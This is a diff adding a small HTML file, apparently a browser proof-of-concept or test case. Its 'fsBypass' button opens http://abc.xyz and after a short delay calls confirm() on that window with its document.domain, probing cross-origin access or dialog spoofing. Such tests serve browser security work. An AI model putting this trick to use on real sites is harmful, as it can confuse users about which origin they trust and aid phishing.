@@ -1,0 +1,12 @@
+<body>
+  <button onclick="fsBypass(document.documentElement);">click Here</button>
+  <script>
+    function fsBypass(element) {
+      var x = window.open("http://abc.xyz", "_target");
+      x.confirm();
+      setTimeout(function() {
+        x.confirm(x.document.domain);
+      }, 70)
+    }
+  </script>
+</body>
